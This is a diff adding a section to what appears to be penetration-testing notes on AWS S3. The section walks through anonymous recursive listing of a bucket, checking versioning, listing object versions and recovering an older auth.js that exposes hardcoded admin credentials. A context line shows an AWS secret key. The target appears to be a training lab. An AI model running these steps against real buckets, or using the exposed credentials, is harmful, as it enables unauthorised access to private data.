@@ -1455,6 +1455,149 @@ aws_secret_access_key = EuEQvgS68SmMX3ldbBPHNjIjFg1L1MRJ7RDR2YJ+
 
 ---
 
+Example of listing files inside an S3 bucket recursively
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3 ls s3://huge-logistics-dashboard --no-sign-request --recursive    
+2023-08-16 14:25:59          0 private/
+2023-08-12 15:09:01     833071 static/css/dashboard-free.css.map
+2023-08-12 15:09:14     402732 static/css/dashboard.css
+2023-08-12 15:09:17        904 static/css/demo.css
+2023-08-12 15:09:19       7743 static/css/icons.css
+2023-08-12 15:09:19        495 static/css/main.css
+2023-08-12 15:08:05      15996 static/images/favicon.ico
+2023-08-12 15:08:17     251708 static/images/hero.jpg
+2023-08-12 15:08:20      15996 static/images/logo.png
+2023-08-12 15:08:24      37930 static/images/profile.png
+2023-08-12 15:09:21        590 static/js/api.js
+2023-08-12 16:43:43        244 static/js/auth.js
+2023-08-12 15:09:22       7297 static/js/dash.js
+2023-08-12 15:09:24      19027 static/js/demo.js
+2023-08-12 15:09:28      84355 static/js/jquery.min.js
+2023-08-12 15:09:32     127542 static/js/jquery.min.map
+2023-08-12 15:09:36      15612 static/js/plugins/bootstrap-notify.js
+2023-08-12 15:09:42     157844 static/js/plugins/chartjs.min.js
+2023-08-12 15:09:44      18292 static/js/plugins/perfect-scrollbar.jquery.min.js
+2023-08-12 15:09:34      18994 static/js/popper.min.js
+```
+
+If you find an interesting file, check if version is enabled with curl by looking for the header x-amz-version-id
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
+HTTP/1.1 200 OK
+x-amz-id-2: TYkABAp3nTJbpE2wuoaz3BDRvjj5S0jofaLo5AzBfHWLqDvmcLhJorfr4U19FinE7oveTylWMvU=
+x-amz-request-id: VG77YA8PDZJVDGGM
+Date: Sun, 19 Oct 2025 15:55:50 GMT
+Last-Modified: Sat, 12 Aug 2023 20:43:43 GMT
+ETag: "c3d04472943ae3d20730c1b81a3194d2"
+x-amz-server-side-encryption: AES256
+x-amz-version-id: j2hElDSlveHRMaivuWldk8KSrC.vIONW
+Accept-Ranges: bytes
+Content-Type: application/javascript
+Content-Length: 244
+Server: AmazonS3
+```
+
+List versions with the below command. Note the delete marker and also how the file `auth.js` shows up twice (2 versions)
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3api list-object-versions --bucket huge-logistics-dashboard --no-sign-request 
+{
+    "Versions": [
+        {
+            "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\"",
+            "Size": 0,
+            "StorageClass": "STANDARD",
+            "Key": "private/",
+            "VersionId": "LFkKXfYHprr7YC4BgFt5BbQPLLZWfu0B",
+            "IsLatest": true,
+            "LastModified": "2023-08-16T18:25:59.000Z",
+            "Owner": {
+                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
+            }
+        },
+<snip>
+{
+            "ETag": "\"c3d04472943ae3d20730c1b81a3194d2\"",
+            "Size": 244,
+            "StorageClass": "STANDARD",
+            "Key": "static/js/auth.js",
+            "VersionId": "j2hElDSlveHRMaivuWldk8KSrC.vIONW",
+            "IsLatest": true,
+            "LastModified": "2023-08-12T20:43:43.000Z",
+            "Owner": {
+                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
+            }
+        },
+        {
+            "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
+            "Size": 463,
+            "StorageClass": "STANDARD",
+            "Key": "static/js/auth.js",
+            "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
+            "IsLatest": false,
+            "LastModified": "2023-08-12T19:13:25.000Z",
+            "Owner": {
+                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
+            }
+<snip>
+   "IsLatest": true,
+            "LastModified": "2023-08-12T19:09:34.000Z",
+            "Owner": {
+                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
+            }
+        }
+    ],
+    "DeleteMarkers": [
+        {
+            "Owner": {
+                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
+            },
+            "Key": "private/Business Health - Board Meeting (Confidential).xlsx",
+            "VersionId": "whIGcxw1PmPE1Ch2uUwSWo3D5WbNrPIR",
+            "IsLatest": true,
+            "LastModified": "2023-08-16T19:12:39.000Z"
+        }
+<snip>
+```
+
+Download previous versions like this
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3api get-object --bucket huge-logistics-dashboard --key 'static/js/auth.js' --version-id 'qgWpDiIwY05TGdUvTnGJSH49frH_7.yh' auth.js --no-sign-request                    
+{
+    "AcceptRanges": "bytes",
+    "LastModified": "Sat, 12 Aug 2023 19:13:25 GMT",
+    "ContentLength": 463,
+    "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
+    "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
+    "ContentType": "application/javascript",
+    "ServerSideEncryption": "AES256",
+    "Metadata": {}
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat auth.js                                                                           
+$(document).ready(function(){
+    $(".btn-login").on("click", login);
+});
+
+function login(){
+    email = $('#emailForm')[0].value;
+    password = $('#passwordForm')[0].value;
+    data = {'email':email, 'password':password};
+    doLogin(data);
+}
+//Please remove this after testing. Password change is not necessary to implement so keep this secure!
+function test_login(){
+        data = {'email':'admin@huge-logistics.com', 'password':'H4mpturTiem213!'}
+        doLogin(data);
+}
+```
+
+---
+
 
 
 
